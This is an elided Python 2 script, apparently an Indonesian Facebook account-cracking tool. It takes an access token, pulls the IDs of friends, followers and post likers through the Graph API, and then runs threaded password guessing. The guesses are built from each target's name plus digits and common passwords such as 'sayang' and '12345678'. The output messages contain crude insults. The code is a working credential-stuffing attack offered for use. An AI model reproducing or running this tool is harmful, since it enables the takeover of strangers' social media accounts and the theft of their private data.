...
def yayanxd():
    ...
    try:
        ...
        print '\n\n %s[%s!%s] token belum ada/salah'%(N,M,N);time.sleep(2);yayanxd()
...
def moch_yayan():
    ...
    try:
        ...
        print '\n %s[%s×%s] token belum ada/salah'%(N,M,N);time.sleep(2);os.system('rm -rf .ppk/.memek.txt');yayanxd()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
    except KeyError:
    ...
    print ' (\033[0;96m•\033[0m) NAMA AKUN FB : %s'%(nama);time.sleep(0.03)
    print ' (\033[0;96m•\033[0m) IP HP   : %s'%(IP)
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' [%s1%s]. Crack id dari teman'%(O,N);time.sleep(0.03)
    ...
    print ' [%s8%s]. Ganti User Agent'%(O,N);time.sleep(0.03)
...
def teman(kontol):
    ...
    try:
        ...
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,kontol)).json()["data"]:
            ...
            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses crack Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
            )); sys.stdout.flush()
            time.sleep(0.0050)

        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil crack id dari teman'%(N,H,N))
        print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
        print 50 * '-'
        raw_input(' [%s ENTER%s ] '%(O,N));moch_yayan()
    except (KeyError,IOError):
        os.remove(cin)
        jalan('\n %s[%s!%s] Gagal crack id, kemungkinan id tidaklah publik.\n'%(N,M,N))
...
def publik(kontol):
    ...
    try:
        ...
        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil crack id dari teman publik'%(N,H,N))
...
def followers(kontol):
    ...
    try:
        ...
        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil crack id dari total followers'%(N,H,N))
...
def postingan(kontol):
    ...
    try:
        ...
        ys.close()
        jalan('\n\n %s[%s✓%s] berhasil crack id dari like postingan'%(N,H,N))
...
def info_tools():
    ...
    print '\n %s[%s>%s] Author   : _zhlnt_.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Github   : https://github.com/zhulos170'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Instagram: https://www.instagram.com/_zhlnt_'%(N,H,N);time.sleep(0.07)
...
class __crack__:
    ...
    def plerr(self):
        try:
            ...
            print '\n %s[%s×%s] File [%s%s%s] tidak ada, crack id dulu lah tolol!'%(N,M,N,M,self.apk,N);time.sleep(3);moch_yayan()
            ...
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        xz = bb[1].split(' ')
                        if len(xz)>=6:
                            pwx = [ xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345", "anjing", "sayang", "12345678", "indonesia", "iloveyou" ]
                        elif len(xz)<=2:
                            pwx = [ xz[0]+"123", xz[0]+"1234", xz[0]+"12345", "anjing", "sayang", "12345678", "indonesia", "iloveyou" ]
                        elif len(xz)<=3:
                            pwx = [ xz[0]+"123", xz[0]+"12345", "anjing", "sayang", "12345678", "indonesia", "iloveyou" ]
                        else:
                            pwx = [ xz[0]+"123", xz[0]+"12345", "anjing", "sayang", "12345678", "indonesia", "iloveyou" ]
